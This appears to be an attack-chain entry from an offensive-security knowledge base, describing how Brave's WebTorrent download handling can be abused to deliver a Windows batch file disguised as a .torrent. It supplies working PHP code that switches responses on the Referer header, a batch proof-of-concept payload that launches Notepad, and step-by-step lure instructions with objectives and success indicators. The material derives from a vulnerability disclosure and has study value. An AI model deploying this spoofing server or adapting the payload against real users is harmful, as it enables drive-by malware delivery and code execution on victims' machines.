---
tags:
  - rce
  - xss
  - webtorrent
  - brave
  - torrent
  - malware
  - file-spoofing
type: attack_chain
tools:
  - '[[tools/WebTorrent]]'
  - '[[tools/PHP]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-Malicious-PHP-Torrent-Server]]'
  - '[[procedures/Trigger-Download-via-Brave-WebTorrent]]'
  - '[[procedures/Execute-Downloaded-Payload-for-RCE]]'
step_count: 3
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Malicious File]]'
updated_at: '2025-12-14T17:23:28.272Z'
description: >-
  Multi-stage attack exploiting WebTorrent in Brave browser to spoof torrent
  files and deliver executable malware, resulting in remote code execution on
  Windows.
skill_level: intermediate
impact_level: high
id: a1b8ce79-72b4-4f24-862b-9ad4b00730e2
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Malicious File]]'
---
# Brave WebTorrent Arbitrary File Download Leading to Client-Side RCE

Multi-stage attack chain demonstrating exploitation of WebTorrent's header-based file validation in Brave browser, allowing attackers to serve spoofed .torrent files that deliver executable malware, bypassing checks via Referer header detection and leading to client-side RCE, XSS, and malware installation on Windows.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Deploy Malicious Server] --> B[Trigger Download in Brave]
    B --> C[Execute Payload]
    C --> D[RCE Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/PHP]]
- [[tools/WebTorrent]] (integrated in Brave)

### Target Environment

- Windows OS
- Brave browser with WebTorrent enabled
- Network access to host malicious server

### Initial Access Requirements

- Victim must visit attacker's controlled webpage
- No credentials required; relies on social engineering or drive-by access
- Server hosting capabilities (e.g., PHP-enabled web server)

## Detailed Attack Procedures

### Step 1: Deploy Malicious Server
procedure: [[procedures/Set-Up-Malicious-PHP-Torrent-Server]]

**Objective**: Set up a PHP server that detects the Referer header from Brave's WebTorrent request to serve a spoofed .torrent response, while serving a malicious .bat file to direct accesses.

**Instructions**: Deploy the server using [[commands/malicious-php-torrent-server]] on a PHP-enabled host like https://php-demo-app-shibli.cfapps.io/test-driver.php. Ensure the server checks $_SERVER['HTTP_REFERER'] to differentiate responses.

```php
<?php
if(isset($_SERVER['HTTP_REFERER'])){
header("Content-Disposition: attachment; filename='PoC.torrent'; filename*=UTF-8''PoC.torrent");
header("Content-Type: application/octet-stream");
}
else{
header("Content-Disposition: attachment; filename='PoC.bat'; filename*=UTF-8''PoC.bat");
header("Content-Type: application/x-bat");
echo"@echo off\n";
echo"START C:\\Windows\\NOTEPAD.EXE";
}
?>
```

**Expected Output**: Server responds with empty .torrent headers if Referer is present; .bat payload if absent.

**Success Indicators**:
- Server accessible via URL
- Referer-based response switching confirmed via curl tests

### Step 2: Trigger Download in Brave
procedure: [[procedures/Trigger-Download-via-Brave-WebTorrent]]

**Objective**: Lure victim to interact with a malicious page in Brave, triggering WebTorrent to request the spoofed torrent file via download prompt.

**Instructions**: Host a demo page at the malicious URL with a 'click me' link that initiates the download. In Brave on Windows, select 'Save .torrent file' in the WebTorrent dialog, which sends a request with Referer header.

**Expected Output**: File downloads as 'PoC.torrent' but contains .bat content due to server spoofing.

**Success Indicators**:
- Download prompt appears in Brave
- File saved with .torrent extension
- No immediate execution; file appears benign

### Step 3: Execute Downloaded Payload for RCE
procedure: [[procedures/Execute-Downloaded-Payload-for-RCE]]

**Objective**: Trick victim into opening the downloaded file, executing the embedded .bat payload to achieve RCE.

**Instructions**: Open the saved 'PoC.torrent' file, which runs the [[commands/rce-batch-payload]] content, launching Notepad.exe as proof-of-concept.

```batch
@echo off
START C:\Windows\NOTEPAD.EXE
```

**Expected Output**: Notepad opens, demonstrating arbitrary code execution.

**Success Indicators**:
- Application launches unexpectedly
- System commands execute without further authentication

## Attack Chain Summary

### Key Achievements

1. Bypassed WebTorrent's file type validation using header spoofing
2. Delivered and executed malware disguised as a torrent file
3. Achieved client-side RCE and potential XSS/malware persistence on Windows

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[Malicious File]] Malicious File

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
